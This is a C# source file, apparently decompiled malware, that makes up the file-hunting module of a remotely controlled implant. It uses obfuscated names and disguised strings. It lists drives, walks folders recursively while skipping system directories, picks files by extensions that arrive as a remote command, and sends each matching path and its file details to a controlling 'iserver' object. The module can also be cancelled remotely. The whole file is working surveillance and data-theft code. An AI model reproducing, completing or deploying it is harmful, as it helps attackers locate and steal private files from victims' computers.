using System;
using System.Collections.Generic;
using System.IO;

namespace rgocrwse;

internal class ortmirdsDRIVF
{
	public ortmirdsMCDM iserver;

	public List<string> ortmirdsfExts = new List<string>();

	public List<string> ortmirdsnotFilders = new List<string>();

	public string ortmirdsmainPath;

	public int ortmirdssIndx = 0;

	public string ortmirdsfilesLogs = ortmirdsCONF.ortmirdsfilesLogs;

	public int ortmirdsfIndx = 0;

	public bool ortmirdsreaging = false;

	public List<string> ortmirdssFiles = new List<string>();

	public IEnumerable<string> ortmirdsaddFiles(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.ortmirdsautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (ortmirdsseeAccess(text) && !ortmirdsnotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public bool ortmirdsseeAccess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public void ortmirdslookFiles(string tempStr)
	{
		iserver.ortmirdsautCnls = false;
		ortmirdsfExts.Clear();
		ortmirdssFiles.Clear();
		ortmirdsfIndx = 0;
		ortmirdssIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				ortmirdsfExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			ortmirdsreaging = true;
			ortmirdssendSearch(array[1]);
			ortmirdsreaging = false;
			iserver.ortmirdspush_data(null, "ortmirds-seard=searched|ortmirds".Split(new char[1] { '|' })[0]);
		}
	}

	public ortmirdsDRIVF()
	{
		ortmirdsnotFilders.Add("clients_data|ortmirds".Split(new char[1] { '|' })[0]);
		ortmirdsnotFilders.Add("program files|ortmirds".Split(new char[1] { '|' })[0]);
		ortmirdsnotFilders.Add("system volume information|ortmirds".Split(new char[1] { '|' })[0]);
		ortmirdsnotFilders.Add("$recycle.bin|ortmirds".Split(new char[1] { '|' })[0]);
		ortmirdsnotFilders.Add("msocache|ortmirds".Split(new char[1] { '|' })[0]);
		ortmirdsnotFilders.Add("recoveDSDF|ortmirds".Split(new char[1] { '|' })[0]);
		ortmirdsnotFilders.Add("documents and settings|ortmirds".Split(new char[1] { '|' })[0]);
		ortmirdsnotFilders.Add("windows|ortmirds".Split(new char[1] { '|' })[0]);
		ortmirdsnotFilders.Add("program files (x86)|ortmirds".Split(new char[1] { '|' })[0]);
		ortmirdsnotFilders.Add("programdata|ortmirds".Split(new char[1] { '|' })[0]);
	}

	public string ortmirdscheckFolders(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (ortmirdsseeAccess(text2))
				{
					text = text + text2 + ">|ortmirds".Split(new char[1] { '|' })[0];
				}
			}
			return text;
		}
		return null;
	}

	public void ortmirdssendSearch(string path)
	{
		try
		{
			foreach (string item in ortmirdsaddFiles(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (ortmirdsfExts.Contains(text.ToLower()))
				{
					string text2 = iserver.ortmirdsfile_info(item, ret: true);
					iserver.ortmirdspush_data(null, "ortmirds-searf=|ortmirds".Split(new char[1] { '|' })[0] + item + "<FILE_AUTO<|ortmirds".Split(new char[1] { '|' })[0] + text2);
				}
				if (iserver.ortmirdsautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string ortmirdslookupFiles(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|ortmirds".Split(new char[1] { '|' })[0];
			}
		}
		else
		{
			text = null;
		}
		return text;
	}

	public string ortmirdslookupDrives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|ortmirds".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}
}
